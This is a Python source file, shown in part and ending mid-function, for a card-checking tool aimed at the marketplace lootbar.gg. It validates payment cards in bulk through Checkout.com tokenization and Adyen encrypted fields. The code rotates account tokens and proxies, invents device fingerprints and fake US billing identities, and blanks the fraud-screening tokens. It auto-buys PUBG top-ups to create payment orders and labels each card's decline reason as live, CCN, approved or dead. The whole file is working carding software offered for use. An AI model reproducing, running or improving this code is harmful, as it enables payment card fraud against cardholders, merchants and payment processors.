import asyncio
import aiohttp
import json
import base64
import time
import uuid
import os
import logging
import re
import struct
import random
import hashlib
from datetime import datetime, timezone
from typing import Optional, Tuple, Dict, Any, List
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
from cryptography.hazmat.primitives import hashes, hmac as crypto_hmac
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from bin_info import bin_block_from_cko_with_fallback, fetch_bin_info, format_bin_block

logger = logging.getLogger(__name__)

API_BASE = "https://api.lootbar.gg"
CKO_PUBLIC_KEY = "pk_saijocqn2lu52prqeubhmwyhye5"
CKO_TOKENIZE_URL = "https://api.checkout.com/tokens"
ADYEN_SF_URL = "https://checkoutshopper-live-us.adyen.com/checkoutshopper/securedfields/live_5SNWDPYWJRBDFM75WVUKOQPJPM7SVXX6/4.4.1/securedFields.html?type=card&d=aHR0cHM6Ly9sb290YmFyLmdn"
PUBG_SELL_ORDER_ID = "T1072890084"
PUBG_UID_PREFIX = "5"

_FIRST_NAMES = ["James","Robert","John","Michael","David","William","Richard","Joseph","Thomas","Charles","Christopher","Daniel","Matthew","Anthony","Mark","Steven","Andrew","Paul","Joshua","Kenneth","Emma","Olivia","Ava","Isabella","Sophia","Mia","Charlotte","Amelia","Harper","Evelyn"]
_LAST_NAMES = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin","Lee","Perez","Thompson","White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson"]
_CITIES = [("New York","NY","10001"),("Los Angeles","CA","90001"),("Chicago","IL","60601"),("Houston","TX","77001"),("Phoenix","AZ","85001"),("Philadelphia","PA","19101"),("San Antonio","TX","78201"),("San Diego","CA","92101"),("Dallas","TX","75201"),("Austin","TX","73301"),("Jacksonville","FL","32099"),("Columbus","OH","43004"),("Charlotte","NC","28201"),("Indianapolis","IN","46201"),("Denver","CO","80201"),("Seattle","WA","98101"),("Boston","MA","02101"),("Nashville","TN","37201"),("Portland","OR","97201"),("Memphis","TN","38101")]
_STREETS = ["Main St","Oak Ave","Elm St","Park Blvd","Cedar Ln","Maple Dr","Pine St","Washington Ave","Lake Dr","Hill Rd","River Rd","Forest Ave","Sunset Blvd","Broadway","Market St"]

def _random_bill_info():
    fn = random.choice(_FIRST_NAMES)
    ln = random.choice(_LAST_NAMES)
    city, state, zipcode = random.choice(_CITIES)
    addr = f"{random.randint(100,9999)} {random.choice(_STREETS)}"
    return {"first_name": fn, "last_name": ln, "city": city, "country": "US", "state": state, "address": addr, "postcode": zipcode}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
]

SCREEN_PROFILES = [
    {"w": 1920, "h": 1080, "depth": 24},
    {"w": 2560, "h": 1440, "depth": 24},
    {"w": 1366, "h": 768, "depth": 24},
    {"w": 1440, "h": 900, "depth": 24},
    {"w": 1536, "h": 864, "depth": 24},
    {"w": 1680, "h": 1050, "depth": 32},
    {"w": 1280, "h": 720, "depth": 24},
    {"w": 3840, "h": 2160, "depth": 30},
]

LANGUAGES = ["en-US", "en-GB", "en", "en-US,en;q=0.9", "en-GB,en;q=0.9"]
TIMEZONE_OFFSETS = [-480, -420, -360, -300, -240, -180, 0, 60, 120, 180, 330, 480, 540]


def _generate_device_fingerprint(seed: str = "") -> dict:
    rng = random.Random(seed) if seed else random.Random()
    ua = rng.choice(USER_AGENTS)
    screen = rng.choice(SCREEN_PROFILES)
    lang = rng.choice(LANGUAGES)
    tz = rng.choice(TIMEZONE_OFFSETS)
    device_id = str(uuid.UUID(int=rng.getrandbits(128)))
    return {
        "user_agent": ua,
        "device_id": device_id,
        "screen_width": screen["w"],
        "screen_height": screen["h"],
        "color_depth": screen["depth"],
        "language": lang,
        "timezone_offset": tz,
    }


def _base_headers(auth_token: str, fingerprint: dict) -> dict:
    return {
        "Authorization": f"PS {auth_token}",
        "Content-Type": "application/json",
        "x-currency": "USD",
        "x-ps-locale": "en",
        "x-ps-device-id": fingerprint.get("device_id", str(uuid.uuid4())),
        "x-ps-app-version-code": "v20260330",
        "x-ps-os-type": "Android",
        "x-ps-system-type": "mobile_web",
        "x-uniq-id": str(uuid.uuid4()),
        "origin": "https://lootbar.gg",
        "referer": "https://lootbar.gg/",
        "User-Agent": fingerprint.get("user_agent", USER_AGENTS[0]),
    }


def _detect_card_brand(cc: str) -> str:
    if cc.startswith('4'):
        return 'visa'
    elif cc.startswith(('51', '52', '53', '54', '55')):
        return 'mc'
    elif len(cc) >= 4 and 2221 <= int(cc[:4]) <= 2720:
        return 'mc'
    elif cc.startswith(('34', '37')):
        return 'amex'
    elif cc.startswith('62'):
        return 'cup'
    elif cc.startswith(('36', '38', '300', '301', '302', '303', '304', '305')):
        return 'diners'
    elif cc.startswith(('6011', '644', '645', '646', '647', '648', '649', '65')):
        return 'discover'
    elif cc.startswith('35'):
        return 'jcb'
    return 'visa'


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')


def _parse_proxy_url(proxy_str: str) -> Optional[str]:
    if not proxy_str or not proxy_str.strip():
        return None
    p = proxy_str.strip()
    if '://' in p:
        return p
    parts = p.split(':')
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return f"http://{p}"


class LootbarAccount:
    def __init__(self, auth_token: str, bill_order_id: str = "",
                 proxy: str = "", fingerprint: Optional[dict] = None,
                 label: str = "", account_id: int = 0):
        self.auth_token = auth_token
        self.bill_order_id = bill_order_id
        self.proxy = proxy
        self.proxy_url = _parse_proxy_url(proxy)
        self.label = label or f"acc_{account_id}"
        self.account_id = account_id
        self.fingerprint = fingerprint or _generate_device_fingerprint(auth_token)
        self.market_pay_id: Optional[str] = None
        self.check_count = 0
        self.max_checks = 50
        self.last_used = 0.0
        self.fail_count = 0
        self.is_dead = False


class AdyenJWE:
    def __init__(self, public_key_str: str):
        parts = public_key_str.split('|')
        self.pub_key = rsa.RSAPublicNumbers(
            e=int(parts[0], 16),
            n=int(parts[1], 16)
        ).public_key(default_backend())

    def _jwe_encrypt(self, plaintext: bytes) -> str:
        header = json.dumps(
            {"alg": "RSA-OAEP", "enc": "A256CBC-HS512", "version": "1"},
            separators=(',', ':')
        ).encode('utf-8')
        hdr_b64 = _b64url(header)

        cek = os.urandom(64)
        mac_key, enc_key = cek[:32], cek[32:]

        encrypted_key = self.pub_key.encrypt(
            cek,
            asym_padding.OAEP(
                mgf=asym_padding.MGF1(algorithm=hashes.SHA1()),
                algorithm=hashes.SHA1(),
                label=None
            )
        )

        iv = os.urandom(16)

        pad_len = 16 - (len(plaintext) % 16)
        padded = plaintext + bytes([pad_len] * pad_len)
        cipher = Cipher(algorithms.AES(enc_key), modes.CBC(iv), backend=default_backend())
        enc = cipher.encryptor()
        ciphertext = enc.update(padded) + enc.finalize()

        aad = hdr_b64.encode('ascii')
        h = crypto_hmac.HMAC(mac_key, hashes.SHA512(), backend=default_backend())
        h.update(aad + iv + ciphertext + struct.pack('>Q', len(aad) * 8))
        tag = h.finalize()[:32]

        return '.'.join([
            hdr_b64,
            _b64url(encrypted_key),
            _b64url(iv),
            _b64url(ciphertext),
            _b64url(tag)
        ])

    def encrypt_field(self, field_name: str, value: str, generation_time: str) -> str:
        obj = {field_name: value, "generationtime": generation_time}
        plaintext = json.dumps(obj, separators=(',', ':')).encode('utf-8')
        return self._jwe_encrypt(plaintext)

    def encrypt_card(self, cc: str, mm: str, yy: str, cvv: str = "", holder_name: str = "John Smith") -> dict:
        gen_time = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")
        yy_full = yy if len(yy) == 4 else f"20{yy}"
        result = {
            "type": "scheme",
            "encryptedCardNumber": self.encrypt_field("number", cc, gen_time),
            "encryptedExpiryMonth": self.encrypt_field("expiryMonth", mm.zfill(2), gen_time),
            "encryptedExpiryYear": self.encrypt_field("expiryYear", yy_full, gen_time),
            "holderName": holder_name,
        }
        if cvv:
            result["encryptedSecurityCode"] = self.encrypt_field("cvc", cvv, gen_time)
        return result


class _OrderConsumedError(Exception):
    pass


class LootbarAdyenChecker:
    def __init__(self, accounts: Optional[List[LootbarAccount]] = None):
        self._accounts: List[LootbarAccount] = accounts or []
        self._jwe: Optional[AdyenJWE] = None
        self._adyen_public_key: Optional[str] = None
        self._account_idx = 0
        self._lock = asyncio.Lock()
        self._dead_bills: set = set()

    def _pick_account(self) -> Optional[LootbarAccount]:
        live = [a for a in self._accounts if not a.is_dead]
        if not live:
            return None
        live.sort(key=lambda a: (a.fail_count, a.last_used))
        return live[0]

    def _rotate_account(self) -> Optional[LootbarAccount]:
        live = [a for a in self._accounts if not a.is_dead]
        if not live:
            return None
        async_lock_not_needed = True
        live.sort(key=lambda a: a.last_used)
        acc = live[0]
        acc.last_used = time.time()
        return acc

    def _get_connector(self, account: LootbarAccount) -> Tuple[aiohttp.TCPConnector, Optional[str]]:
        connector = aiohttp.TCPConnector(ssl=False, limit=5)
        return connector, account.proxy_url

    async def _get_session(self, account: LootbarAccount) -> Tuple[aiohttp.ClientSession, Optional[str]]:
        connector, proxy_url = self._get_connector(account)
        session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=60)
        )
        return session, proxy_url

    ADYEN_KEY_FALLBACK = "10001|A99EEA230707EEEF06C6125CE68FF1540E77ED79976541648244AF91E0F2168EF967F4C70CD31C927CCC419A0F3493F9FD6CA1092F1C1F47F6D879A3172FD0404CC61FD1C4784127F5ACAB3676ED48F5A051624B14E6B6239458618886C097389D988995C4BE6988A2EAA6CA27A7C924F663C9E02EC61F1B9FEC8C1A158EB77F23F3F44E6AD769C02C8A90C1E1F4A29EC57C4B8EE899C816D69C6BB1A45A7BED91D36CD5D4CFF5FF02C3AB1899A11CA82D437F3FDF91E341774B9FEE05B762009BFF0640C69A3F26281D4C4F8706C554C9EB820EFA1AA0261E52669F929366FF665C3E4E022AB0993AD74AA9CB4EBB2FDAAA19027D937335F80C8230073904AD"

    async def _fetch_adyen_public_key(self, session: aiohttp.ClientSession, proxy_url: Optional[str] = None) -> str:
        try:
            async with session.get(
                ADYEN_SF_URL,
                headers={"Referer": "https://lootbar.gg/"},
                proxy=proxy_url
            ) as resp:
                text = await resp.text()
            m = re.search(r'(10001\|[0-9A-Fa-f]+)', text)
            if m:
                return m.group(1)
        except Exception as e:
            logger.warning(f"[LOOTBAR] Adyen CDN fetch failed: {e}")
        logger.info("[LOOTBAR] Using fallback Adyen public key")
        return self.ADYEN_KEY_FALLBACK

    async def _init_jwe(self, session: aiohttp.ClientSession, proxy_url: Optional[str] = None) -> None:
        if self._jwe:
            return
        key = await self._fetch_adyen_public_key(session, proxy_url)
        self._adyen_public_key = key
        self._jwe = AdyenJWE(key)
        logger.info("[LOOTBAR] Adyen JWE initialized")

    async def _try_repay_preview(self, session: aiohttp.ClientSession, account: LootbarAccount,
                                  bill_order_id: str, headers: dict, proxy_url: Optional[str] = None) -> Tuple[Optional[str], str]:
        try:
            async with session.post(
                f"{API_BASE}/api/market/goods/cashier/repay_preview",
                headers=headers,
                json={"game": "main", "bill_order_id": bill_order_id},
                proxy=proxy_url
            ) as resp:
                r = await resp.json()
                if r.get('status') == 'ok':
                    bill = r.get('data', {}).get('bill_order', {})
                    mpid = bill.get('market_pay_id')
                    if mpid:
                        pay_order = bill.get('pay_order', {})
                        pay_order_id = pay_order.get('id', '') if isinstance(pay_order, dict) else ''
                        if pay_order_id and pay_order_id != mpid:
                            try:
                                async with session.get(
                                    f"{API_BASE}/api/v2/asset/pay/detail?pay_order_id={pay_order_id}",
                                    headers=headers,
                                    proxy=proxy_url
                                ) as detail_resp:
                                    detail = await detail_resp.json()
                                    detail_data = detail.get('data') or {}
                                    detail_state = detail_data.get('state', 0) if isinstance(detail_data, dict) else 0
                                    if detail_state in (4, 5, 11):
                                        failure = detail_data.get('failure_reason', '')
                                        logger.warning(f"[LOOTBAR:{account.label}] Bill {bill_order_id} pay_order {pay_order_id} already failed (state={detail_state}): {failure[:40]}")
                                        return None, "expired"
                            except Exception:
                                pass
                        account.bill_order_id = bill_order_id
                        account.market_pay_id = mpid
                        account.check_count = 1
                        return mpid, "ok"
                msg = r.get('msg', '').lower()
                if any(k in msg for k in ['expired', 'not found', 'cancelled', 'canceled', 'invalid', 'does not exist', 'closed']):
                    logger.warning(f"[LOOTBAR:{account.label}] Bill {bill_order_id} confirmed dead: {r.get('msg','')[:60]}")
                    return None, "expired"
                logger.warning(f"[LOOTBAR:{account.label}] repay_preview failed for {bill_order_id}: {r.get('msg','')[:60]}")
                return None, "api_error"
        except Exception as e:
            logger.warning(f"[LOOTBAR:{account.label}] repay_preview network error for {bill_order_id}: {e}")
            return None, "network_error"

    async def _find_existing_unpaid_bills(self, session: aiohttp.ClientSession, account: LootbarAccount,
                                           headers: dict, proxy_url: Optional[str] = None) -> list:
        bills = []
        for status_code in [1, 2]:
            try:
                async with session.get(
                    f"{API_BASE}/api/v2/market/bill_order?status={status_code}&page_num=1&page_size=20",
                    headers=headers,
                    proxy=proxy_url
                ) as resp:
                    text = await resp.text()
                    r = json.loads(text) if text.strip().startswith('{') else {}
                    items = r.get('data', {}).get('items', []) if isinstance(r.get('data'), dict) else []
                    for item in items:
                        bid = item.get('bill_order_id', item.get('id', ''))
                        if bid:
                            bills.append(bid)
            except Exception:
                pass
        return bills

    def _generate_pubg_uid(self, seed: str = "") -> str:
        rng = random.Random(seed or str(time.time()))
        return PUBG_UID_PREFIX + ''.join([str(rng.randint(0, 9)) for _ in range(9)])

    async def _buy_pubg_topup(self, session: aiohttp.ClientSession, account: LootbarAccount,
                               headers: dict, proxy_url: Optional[str] = None) -> Optional[str]:
        pubg_uid = self._generate_pubg_uid(account.auth_token + str(time.time()))
        buy_payload = {
            "game": "pubg",
            "sell_order_id": PUBG_SELL_ORDER_ID,
            "pay_method": 7,
            "num": 1,
            "allow_repay": True,
            "extra": {"uid": pubg_uid},
        }
        try:
            async with session.post(
                f"{API_BASE}/api/market/goods/buy",
                headers=headers,
                json=buy_payload,
                proxy=proxy_url
            ) as resp:
                r = await resp.json()
                if r.get('status') == 'ok':
                    data = r.get('data', {})
                    item = data.get('item', {}) if isinstance(data.get('item'), dict) else {}
                    bill_id = (data.get('buy_order_id', '') or data.get('bill_order_id', '')
                               or item.get('bill_order_id', '') or item.get('buy_order_id', ''))
                    pay_order_id = (data.get('pay_order_id', '') or data.get('market_pay_id', '')
                                    or item.get('market_pay_id', '') or item.get('pay_order_id', ''))
                    if bill_id:
                        logger.info(f"[LOOTBAR:{account.label}] Bought PUBG 60UC -> bill {bill_id} pay_order {pay_order_id}")
                        mpid, reason = await self._try_repay_preview(session, account, bill_id, headers, proxy_url)
                        if mpid:
                            return mpid
                        if pay_order_id:
                            account.bill_order_id = bill_id
                            account.market_pay_id = pay_order_id
                            account.check_count = 1
                            return pay_order_id
                    elif pay_order_id:
                        account.market_pay_id = pay_order_id
                        account.check_count = 1
                        return pay_order_id
                else:
                    logger.warning(f"[LOOTBAR:{account.label}] PUBG buy failed: {r.get('msg','')[:60]}")
        except Exception as e:
            logger.warning(f"[LOOTBAR:{account.label}] PUBG buy error: {e}")
        return None

    async def _ensure_order(self, session: aiohttp.ClientSession, account: LootbarAccount, proxy_url: Optional[str] = None) -> str:
        if account.market_pay_id and account.check_count < account.max_checks:
            account.check_count += 1
            return account.market_pay_id

        headers = _base_headers(account.auth_token, account.fingerprint)
        headers["Content-Type"] = "application/json"

        bill_confirmed_dead = False
        had_network_error = False

        if account.bill_order_id and account.bill_order_id not in self._dead_bills:
            mpid, reason = await self._try_repay_preview(session, account, account.bill_order_id, headers, proxy_url)
            if mpid:
                logger.info(f"[LOOTBAR:{account.label}] Reusing bill {account.bill_order_id} -> {mpid}")
                return mpid
            if reason == "expired":
                bill_confirmed_dead = True
                self._dead_bills.add(account.bill_order_id)
            elif reason == "network_error":
                had_network_error = True
                raise Exception("NETWORK_ERROR: Could not reach Lootbar API, will retry next card")
        elif account.bill_order_id in self._dead_bills:
            bill_confirmed_dead = True

        if not had_network_error:
            logger.info(f"[LOOTBAR:{account.label}] Scanning for existing unpaid bills...")
            existing_bills = await self._find_existing_unpaid_bills(session, account, headers, proxy_url)
            for bid in existing_bills:
                if bid == account.bill_order_id or bid in self._dead_bills:
                    continue
                mpid, reason = await self._try_repay_preview(session, account, bid, headers, proxy_url)
                if mpid:
                    logger.info(f"[LOOTBAR:{account.label}] Recovered with existing bill {bid} -> {mpid}")
                    return mpid

            logger.info(f"[LOOTBAR:{account.label}] No reusable bills, auto-buying PUBG 60UC top-up...")
            mpid = await self._buy_pubg_topup(session, account, headers, proxy_url)
            if mpid:
                return mpid

        if bill_confirmed_dead:
            raise Exception(
                "BILL_EXPIRED: Bill order confirmed expired/cancelled by Lootbar. "
                "Update via /lbcookie with a fresh bill_order_id"
            )

        raise Exception(
            "ORDER_FAILED: Could not get a working order — will retry on next card"
        )

    async def _tokenize_card_cko(
        self,
        session: aiohttp.ClientSession,
        cc: str,
        mm: str,
        yy: str,
        cvv: str = "",
        proxy_url: Optional[str] = None
    ) -> Tuple[Optional[dict], Optional[str]]:
        yy_full = int(yy) if len(yy) == 4 else int(f"20{yy}")
        cko_headers = {
            "Authorization": CKO_PUBLIC_KEY,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        }
        token_body = {
            "type": "card",
            "number": cc,
            "expiry_month": int(mm),
            "expiry_year": yy_full,
        }
        if cvv:
            token_body["cvv"] = cvv
        try:
            async with session.post(
                CKO_TOKENIZE_URL,
                headers=cko_headers,
                json=token_body,
                proxy=proxy_url
            ) as resp:
                if resp.status == 201:
                    return await resp.json(), None
                text = await resp.text()
                if resp.status == 422:
                    try:
                        err = json.loads(text)
                        codes = err.get('error_codes', [])
                        if 'card_number_invalid' in codes or 'card_expired' in codes:
                            return None, "card_rejected"
                    except Exception:
                        pass
                    return None, "card_rejected"
                if resp.status >= 500:
                    logger.warning(f"[LOOTBAR] CKO tokenize server error {resp.status}")
                    return None, "server_error"
                logger.warning(f"[LOOTBAR] CKO tokenize HTTP {resp.status}: {text[:100]}")
                return None, "card_rejected"
        except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as e:
            logger.warning(f"[LOOTBAR] CKO tokenize network error: {e}")
            return None, "network_error"
        except Exception as e:
            logger.warning(f"[LOOTBAR] CKO tokenize error: {e}")
            return None, "network_error"

    async def _submit_card_cko(
        self,
        session: aiohttp.ClientSession,
        account: LootbarAccount,
        market_pay_id: str,
        cko_token_data: dict,
        proxy_url: Optional[str] = None
    ) -> dict:
        headers = _base_headers(account.auth_token, account.fingerprint)

        bill_info = _random_bill_info()
        card_info = {
            "checkout_card": {
                "token": cko_token_data.get("token", ""),
                "scheme": cko_token_data.get("scheme", "VISA"),
                "last4": cko_token_data.get("last4", ""),
                "bin": cko_token_data.get("bin", ""),
                "card_type": cko_token_data.get("card_type", "Debit"),
                "card_category": cko_token_data.get("card_category", "Consumer"),
                "expiry_month": cko_token_data.get("expiry_month", 1),
                "expiry_year": cko_token_data.get("expiry_year", 2030),
            },
            "bill_info": bill_info,
        }

        payload = {
            "market_pay_id": market_pay_id,
            "forter_token": "undefined",
            "riskified_token": "undefined",
            "card_info": card_info,
        }

        async with session.post(
            f"{API_BASE}/api/v2/asset/pay/checkout_card/request",
            headers=headers,
            json=payload,
            proxy=proxy_url
        ) as resp:
            return await resp.json()

    async def _submit_card_adyen(
        self,
        session: aiohttp.ClientSession,
        account: LootbarAccount,
        market_pay_id: str,
        payment_method: dict,
        card_brand: str,
        cc: str,
        proxy_url: Optional[str] = None
    ) -> dict:
        headers = _base_headers(account.auth_token, account.fingerprint)
        fp = account.fingerprint

        card_info = {
            "bin": cc[:6] if len(cc) >= 6 else cc,
            "last4": cc[-4:] if len(cc) >= 4 else cc,
            "card_brand": card_brand,
        }

        browser_info = {
            "acceptHeader": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "colorDepth": fp.get("color_depth", 24),
            "language": fp.get("language", "en-US"),
            "javaEnabled": False,
            "screenHeight": fp.get("screen_height", 1080),
            "screenWidth": fp.get("screen_width", 1920),
            "userAgent": fp.get("user_agent", USER_AGENTS[0]),
            "timeZoneOffset": fp.get("timezone_offset", -330),
        }

        additional_info = {
            "browserInfo": browser_info,
            "origin": "https://lootbar.gg",
            "channel": "Web"
        }

        payload = {
            "market_pay_id": market_pay_id,
            "card_info": card_info,
            "card_brand": card_brand,
            "payment_method": payment_method,
            "additional_info": additional_info,
            "forter_token": "undefined"
        }

        async with session.post(
            f"{API_BASE}/api/v2/asset/pay/adyen/card/request",
            headers=headers,
            json=payload,
            proxy=proxy_url
        ) as resp:
            return await resp.json()

    async def _poll_pay_detail(
        self,
        session: aiohttp.ClientSession,
        account: LootbarAccount,
        pay_order_id: str,
        max_polls: int = 12,
        proxy_url: Optional[str] = None
    ) -> Optional[dict]:
        headers = _base_headers(account.auth_token, account.fingerprint)
        for i in range(max_polls):
            await asyncio.sleep(2)
            try:
                async with session.get(
                    f"{API_BASE}/api/v2/asset/pay/detail?pay_order_id={pay_order_id}",
                    headers=headers,
                    proxy=proxy_url
                ) as resp:
                    r = await resp.json()
                    data = r.get('data', {})
                    if not data:
                        continue
                    state = data.get('state', 0)
                    if state not in (1, 2):
                        return data
            except Exception:
                pass
        return None

    @staticmethod
    def classify_response(submit_result: dict, poll_result: Optional[dict] = None) -> Tuple[str, str]:
        status = submit_result.get('status', '')
        msg = submit_result.get('msg', '')
        data = submit_result.get('data') or {}

        if status == 'Invalid Argument':
            return 'error', f"API rejected: {msg}"

        if status != 'ok':
            msg_lower = msg.lower()
            if 'order' in msg_lower and ('paid' in msg_lower or 'processed' in msg_lower):
                return 'error', f"Order consumed: {msg}"
            if 'realname' in msg_lower or 'kyc' in msg_lower:
                return 'error', f"KYC required: {msg}"
            return 'error', f"API Error ({status}): {msg}"

        action = data.get('action')
        redirect_url = data.get('redirect_url', '')
        pay_order_id = data.get('pay_order_id', '')

        if poll_result:
            state = poll_result.get('state', 0)
            failure = poll_result.get('failure_reason', '') or ''
            failure = re.sub(r'<[^>]+>', '', failure).strip()
            failure = re.sub(r'\s+', ' ', failure)
            failure_lower = failure.lower()

            if state == 3:
                return 'approved', f"Charged! Payment succeeded"

            if state in (4, 5, 11):
                if any(k in failure_lower for k in ['cvc', 'cvv', 'security code']):
                    return 'ccn', f"CCN: {failure}"

                if any(k in failure_lower for k in ['3d secure', '3ds', 'challenge']):
                    return 'ccn', f"CCN (3DS): {failure}"

                if 'insufficient' in failure_lower or 'not enough' in failure_lower:
                    return 'live', f"Insufficient Funds: {failure}"

                if 'restricted' in failure_lower or 'blocked' in failure_lower:
                    return 'live', f"Restricted: {failure}"

                if any(k in failure_lower for k in ['stolen', 'lost', 'fraud', 'pick up']):
                    return 'live', f"Flagged: {failure}"

                if any(k in failure_lower for k in ['acquirer', 'issuer unavailable', 'try again']):
                    return 'live', f"Issuer Error: {failure}"

                if 'refer' in failure_lower and 'issuer' in failure_lower:
                    return 'ccn', f"CCN (Refer to issuer): {failure}"

                if 'expired' in failure_lower:
                    return 'declined', f"Expired: {failure}"

                if any(k in failure_lower for k in [
                    'invalid card', 'invalid pan', 'no such issuer',
                    'card number is wrong', 'unknown card', 'incorrect number'
                ]):
                    return 'declined', f"Dead: {failure}"

                if 'risk' in failure_lower or 'high-risk' in failure_lower:
                    return 'declined', f"Risk decline: {failure}"

                if 'refused' in failure_lower or 'declined' in failure_lower or 'do not honor' in failure_lower:
                    return 'declined', f"Declined: {failure}"

                if 'unable to decrypt' in failure_lower:
                    return 'error', f"Encryption error: {failure}"

                if failure:
                    return 'declined', f"Declined ({state}): {failure}"

                return 'declined', f"Failed (state={state})"

            if state == 2:
                return 'ccn', f"CCN: Processing (likely 3DS pending)"

        if poll_result is None and pay_order_id:
            if redirect_url:
                return 'declined', f"Declined: 3DS redirect but payment never settled (unverified)"
            if action:
                action_type = action.get('type', '') if isinstance(action, dict) else str(action)
                return 'declined', f"Declined: 3DS {action_type} but payment never settled (unverified)"
            return 'declined', f"Declined: payment never settled (pid={pay_order_id})"

        if pay_order_id and not action:
            return 'declined', f"Submitted, no 3DS (likely declined)"

        return 'declined', f"Unknown response"

    async def _get_order_and_submit(self, session: aiohttp.ClientSession, account: LootbarAccount,
                                     cc: str, mm: str, yy: str, cvv: str = "", proxy_url: Optional[str] = None) -> Tuple[str, str]:
        market_pay_id = await self._ensure_order(session, account, proxy_url)

        async def _print_bin_block_cko(token_data):
            try:
                async with aiohttp.ClientSession() as own_session:
                    blk = await bin_block_from_cko_with_fallback(token_data, session=own_session)
                    print(blk, flush=True)
            except Exception:
                pass

        async def _print_bin_block_from_number(card_number):
            try:
                async with aiohttp.ClientSession() as own_session:
                    info = await fetch_bin_info(card_number[:6], session=own_session)
                    if info and not info.get("_error") and any(v for k, v in info.items() if k != "_error" and v):
                        brand = info.get("scheme") or info.get("brand") or "?"
                        funding = info.get("type") or "?"
                        country = info.get("country_alpha2") or "?"
                        bank = info.get("bank_name") or None
                        product_type = info.get("product_type") or ""
                        three_ds = product_type if product_type else "unknown"
                        blk = format_bin_block(brand=brand, funding=funding, country=country,
                                               three_ds=three_ds, checks="all None", bank=bank)
                        print(blk, flush=True)
            except Exception:
                pass

        bin_task = None
        cko_token_data, cko_error = await self._tokenize_card_cko(session, cc, mm, yy, cvv, proxy_url)
        if cko_token_data and cko_token_data.get('token'):
            bin_task = asyncio.create_task(_print_bin_block_cko(cko_token_data))
            result = await self._submit_card_cko(
                session, account, market_pay_id, cko_token_data, proxy_url
            )
            logger.info(f"[LOOTBAR:{account.label}] CKO {cc[:6]}***{cc[-4:]} -> {result.get('status')} | {result.get('msg', '')[:60]}")
        elif cko_error == "card_rejected":
            bin_task = asyncio.create_task(_print_bin_block_from_number(cc))
            await bin_task
            bin_task = None
            return 'declined', "Dead: Card rejected by Checkout.com tokenization (invalid card/expiry)"
        elif cko_error in ("network_error", "server_error"):
            bin_task = asyncio.create_task(_print_bin_block_from_number(cc))
            await self._init_jwe(session, proxy_url)
            payment_method = self._jwe.encrypt_card(cc, mm, yy, cvv)
            card_brand = _detect_card_brand(cc)
            result = await self._submit_card_adyen(
                session, account, market_pay_id, payment_method, card_brand, cc, proxy_url
            )
            logger.info(f"[LOOTBAR:{account.label}] Adyen {cc[:6]}***{cc[-4:]} -> {result.get('status')} | {result.get('msg', '')[:60]}")
        else:
            return 'error', f"CKO tokenize failed: {cko_error}"

        status = result.get('status', '')
        msg = result.get('msg', '')
        msg_lower = msg.lower()

        if status != 'ok' and ('cannot be paid' in msg_lower or ('order' in msg_lower and ('paid' in msg_lower or 'processed' in msg_lower or 'expired' in msg_lower))):
            raise _OrderConsumedError(msg)

        if status != 'ok' and ('realname' in msg_lower or 'kyc' in msg_lower):
            logger.warning(f"[LOOTBAR:{account.label}] KYC required — this account needs identity verification")
            return 'error', f"KYC required: Account needs real-name verification on lootbar.gg"

        data = result.get('data') or {}
        action = data.get('action')
        pay_order_id = data.get('pay_order_id', '')

        redirect_url = data.get('redirect_url', '')

        if action or redirect_url:
            print(f"  VBV Status: \U0001f512 3DS/VBV Required", flush=True)
        elif pay_order_id:
            print(f"  VBV Status: \u2705 Non-VBV", flush=True)

        poll_result = None
        if pay_order_id:
            poll_result = await self._poll_pay_detail(session, account, pay_order_id, max_polls=12, proxy_url=proxy_url)

        return self.classify_response(result, poll_result)

    async def check_card(self, cc: str, mm: str, yy: str, cvv: str = "") -> Tuple[str, str]:
        account = self._rotate_account()
        if not account:
            return 'error', "No active Lootbar accounts available"

        account.fingerprint = _generate_device_fingerprint(account.auth_token + str(time.time()))
        account.market_pay_id = None

        session = None
        try:
            session, proxy_url = await self._get_session(account)

            await self._init_jwe(session, proxy_url)

            max_retries = 2
            for attempt in range(max_retries):
                try:
                    classification, details = await self._get_order_and_submit(
                        session, account, cc, mm, yy, cvv, proxy_url
                    )
